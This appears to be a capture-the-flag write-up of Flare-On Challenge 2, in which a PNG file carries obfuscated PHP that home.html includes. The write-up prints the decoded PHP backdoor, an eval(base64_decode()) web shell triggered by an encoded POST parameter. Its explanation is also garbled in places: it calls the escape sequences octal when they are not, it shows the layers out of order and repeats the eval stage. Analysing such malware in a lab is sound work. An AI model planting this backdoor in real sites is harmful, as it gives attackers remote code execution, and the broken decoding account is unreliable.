# Flare-On Challenge 2: The Web Server

**Category:** Web Security / Steganography | **Difficulty:** Easy | **Platform:** PHP / Polyglot

## Challenge Description
The challenge files consist of a web directory containing a `home.html` file and an `img` folder housing a PNG image (`flare-on.png`). The HTML page describes the rules of the Flare-On challenge. 

The goal is to analyze the web files to locate the hidden email address (flag).

## Tools Used
* **Text Editor** (Sublime Text / Notepad++) - *Source code inspection*
* **Python 3** - *De-obfuscation scripting*
* **CyberChef / Base64 Decoder** - *Payload decoding*

---

## 1. Initial Triage & Anomaly Detection

We began by inspecting the source code of the entry point, `home.html`. 
While the HTML appeared to be a standard Bootstrap page, scrolling to the bottom revealed a critical anomaly:

```html
<script type="text/javascript">
    // ... jQuery countdown code ...
</script>
<?php include "img/flare-on.png" ?>

```

## 2. Static Analysis (De-obfuscation)

The challenge began with a valid PNG file (`img/flare-on.png`) that had a block of obfuscated PHP code appended to its end.

### Layer 1: Array Reconstruction (Substitution Cipher)

The initial PHP code used a simple substitution cipher to hide its true content:
1.  An array of scattered characters (`$terms`).
2.  An array of numerical indices (`$order`).
3.  A loop that mapped indices from `$order` to characters in `$terms` to reconstruct the final string.

**Pseudocode for Solver Script:**
```python
# Solver Script Logic
terms = ["M", "Z", "]", "p", ...]  # Array of scattered characters
order = [59, 71, 73, 13, ...]  # Array of numerical indices

# Reconstruct the string
decoded_code = "".join([terms[i] for i in order])

print(decoded_code)
```
```php
eval(base64_decode($_));
```
## 3. The Solution

We took the large Base64 string found in Layer 2 and decoded it to reveal the final logic block (Layer 3).

### The Payload Logic
The final PHP code checks for a specific HTTP POST parameter to authorize execution:

```php
if(isset($_POST["\97\49\49\68\x4F\84\116\x68\97\x74\x74\x44\x4F\x54\x6a\x61\x76\x61\x35\x63\x72\x61\x70\x41\x54\x66\x6c\x61\x72\x65\x44\x41\x53\x48\x6f\x6e\x44\x4F\x54\x63\x6f\x6d"])) { 
    eval(base64_decode($_POST["..."])); 
}
```
Result (Layer 2): The script output revealed a standard PHP backdoor structure:
```php
eval(base64_decode($_));
```
##
The key to the challenge is the name of the POST parameter itself. It is encoded using a mix of Octal (\97) and Hexadecimal (\x4F) escape sequences.
###Decoding the Flag
Decoding the string character by character:

* \97 -> a
* \49 -> 1
* \49 -> 1
* \68 -> D (. via standard Flare-On formatting)
* \x4F -> O
* \84 -> T
The decoded string spells out: a11DOTthatDOTjava5crapATflareDASHonDOTcom
Converting the phonetic symbols to standard characters gives us the flag.

#### Flag:

   ***"a11.that.java5crap@flare-on.com"***
##
## Lessons Learned
1. ***Inspect Includes:*** In a CTF context, any include statement pointing to a non-script file (like .jpg or .png) is almost certainly a polyglot attack vector.
2. ***Strings are Data:*** Code obfuscation often relies on breaking strings into arrays. Reassembling them in a separate script is a reliable way to analyze malware safely.
3. ***Check the End:*** Steganography often hides data at the very end of valid file structures (End of File / IEND chunk) where renderers ignore it.
